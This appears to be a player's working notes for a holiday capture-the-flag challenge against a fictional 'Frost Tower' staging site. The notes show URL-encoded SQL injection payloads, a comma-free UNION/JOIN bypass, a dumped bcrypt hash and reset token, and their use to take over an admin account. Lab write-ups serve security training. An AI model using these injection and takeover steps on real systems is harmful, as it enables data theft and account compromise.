@@ -1,0 +1,176 @@
+12) Frost Tower Website Checkup
+Difficulty: 
+Investigate Frost Tower's website for security issues. This source code will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.
+
+go to contact page, submit email
+go to contact page, re-submit email
+"uniqueID" is set with email
+can go to pages now because of the validation against session.uniqueID
+
+lists all content in uniquecontact
+https://staging.jackfrosttower.com/detail/600,601,602%20OR%201%3D1
+
+
+something is preventing sqlmap from going all the way...
+
+Database: encontact
+[4 tables]
++---------------+
+| emails        |
+| todo          |
+| uniquecontact |
+| users         |
++---------------+
+
+
+Database: encontact
+Table: todo
+[5 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| country | non-numeric |
+| email   | non-numeric |
+| id      | numeric     |
+| note    | non-numeric |
+| phone   | numeric     |
++---------+-------------+
+
+
+this don't work but it's in effect what i want?
+https://staging.jackfrosttower.com/detail/600,666%20UNION%20ALL%20SELECT%20email%20FROM%20users,602
+columns have to line up...
+
+
+SELECT * FROM uniquecontact WHERE id=[raw query] or id=?
+
+SELECT * FROM uniquecontact WHERE id=
+1 OR 1=1 UNION ALL SELECT 
+or id?
+
+select id,name,password,email,user_status,date_created,date_created from users
+
+%2C = ,
+
+%20UNION%20ALL%20SELECT%20id%2Cname%2Cpassword%2Cemail%2Cuser_status%2Cdate_created%2Cdate_created%20FROM%20users
+
+
+https://staging.jackfrosttower.com/detail/600,666%20UNION%20ALL%20SELECT%20*%20FROM%20uniquecontact--,602
+this duplicates results...
+
+don't seem to be able to semi colon out anything
+
+id:id (good)
+full_name:name (good)
+email:email (good)
+phone (varchar 50):password (varchar 255)
+country (varchar 255):user_status (varchar 10)
+date_created:date_created (good)
+date_update (datetime):token (varchar 255) 
+
+CREATE DATABASE `encontact`;
+
+USE `encontact`;
+
+/*Table structure for table `uniquecontact` */
+DROP TABLE IF EXISTS `uniquecontact`;
+
+CREATE TABLE `uniquecontact` (
+  `id` int(50) NOT NULL AUTO_INCREMENT,
+  `full_name` varchar(255) DEFAULT NULL,
+  `email` varchar(255) DEFAULT NULL,
+  `phone` varchar(50) DEFAULT NULL,
+  `country` varchar(255) DEFAULT NULL,
+  `date_created` datetime DEFAULT NULL,
+  `date_update` datetime DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=33 DEFAULT CHARSET=latin1;
+
+
+/*Table structure for table `users` */
+DROP TABLE IF EXISTS `users`;
+
+CREATE TABLE `users` (
+  `id` int(50) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) DEFAULT NULL,
+  `email` varchar(255) DEFAULT NULL,
+  `password` varchar(255) DEFAULT NULL,
+  `user_status` varchar(10) DEFAULT NULL,
+  `date_created` datetime DEFAULT NULL,
+  `token` varchar(255) DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
+
+
+/* Table structure for table `emails` */
+DROP TABLE IF EXISTS `emails`;
+
+CREATE TABLE `emails` (
+    `id` int(50) NOT NULL AUTO_INCREMENT,
+    `email` varchar(255) DEFAULT NULL,
+    PRIMARY KEY (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+
+
+https://staging.jackfrosttower.com/detail/666%20UNION%20ALL%20SELECT%20*%20FROM%20users--,602
+TypeError: /app/webpage/detail.ejs:29
+    27|                             -
+    28|                         <% }else { %>
+ >> 29|                             <%= dateFormat(encontact.date_update, "mmmm dS, yyyy h:MM:ss") %>
+    30|                         <% } %>                     
+    31|                         </li>
+    32|                     </ul>
+
+Invalid date
+    at Object.dateFormat (/app/node_modules/dateformat/lib/dateformat.js:39:17)
+    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:45:26)
+    at Array.forEach (<anonymous>)
+    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:21:18)
+    at returnedFn (/app/node_modules/ejs/lib/ejs.js:653:17)
+    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:251:36)
+    at View.exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:482:10)
+    at View.render (/app/node_modules/express/lib/view.js:135:8)
+    at tryRender (/app/node_modules/express/lib/application.js:640:10)
+    at Function.render (/app/node_modules/express/lib/application.js:592:3)
+
+
+SELECT * FROM uniquecontact WHERE id=666 OR 1=1 UNION ALL SELECT * FROM users --or id?
+
+select * from (select meta_id from wp_commentmeta)a join (select comment_id from wp_commentmeta)b;
+
+select * from (select id from users)a join (select name from users)b join (select email from users)c join (select password from users)d join (select token from users)e join (select date_created from users)f join (select date_created from users)g LIMIT 10
+666%20UNION%20ALL%20select%20*%20from%20(select%20id%20from%20users)a%20join%20(select%20name%20from%20users)b%20join%20(select%20email%20from%20users)c%20join%20(select%20password%20from%20users)d%20join%20(select%20token%20from%20users)e%20join%20(select%20date_created%20from%20users)f%20join%20(select%20date_created%20from%20users)g%20LIMIT%2010--,602
+
+
+root@localhost
+$2b$15$KOFchO9HQuAuGqs0SqYKq.fH1n8ssHP7.nSL58Dd53doWHkNoJtte
+xBINAYZJNglGGtsh16uVGyRLKylD0vlc
+November 23rd, 2021 11:00:00
+November 23rd, 2021 11:00:00
+
+666%20UNION%20ALL%20select%20*%20from%20(select%20id%20from%20todo)a%20join%20(select%20note%20from%20todo)b%20join%20(select%20email%20from%20todo)c%20join%20(select%20password%20from%20users)d%20join%20(select%20token%20from%20users)e%20join%20(select%20date_created%20from%20users)f%20join%20(select%20date_created%20from%20users)g%20LIMIT%2010--,602
+
+can go to forgotpass/token/xBINAYZJNglGGtsh16uVGyRLKylD0vlc to set username/password for root@localhost
+made henlo@kitten:henlo kitten as super user
+looks like the forgot password link got used up for root@localhost
+
+
+by changing the where id = portion of the select note from todo we can view the output of the notes field in the table
+
+https://staging.jackfrosttower.com/detail/666%20UNION%20ALL%20select%20*%20from%20(select%20note%20from%20todo)a%20join%20(select%20id%20from%20todo)b%20join%20(select%20note%20from%20todo%20where%20id%3D2)c%20join%20(select%20password%20from%20users)d%20join%20(select%20token%20from%20users)e%20join%20(select%20date_created%20from%20users)f%20join%20(select%20date_created%20from%20users)g%20LIMIT%2010--,602
+
+todo 1: Buy up land all around Santa's Castle
+todo 2: Build bigger and more majestic tower next to Santa's
+todo 3: Erode Santa's influence at the North Pole via FrostFest, the greatest Con in history
+todo 4: Dishearten Santa's elves and encourage defection to our cause
+todo 5: Steal Santa's sleigh technology and build a competing and way better Frosty present delivery vehicle
+todo 6: Undermine Santa's ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem
+Force Santa to cancel Christmas
+
+SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide... so the whole world sees that Frost saved the Holiday Season!!!! Bwahahahahaha!
+
+With Santa defeated, offer the old man a job as a clerk in the Frost Tower Gift Shop so we can keep an eye on him
+
+
+answer: clerk
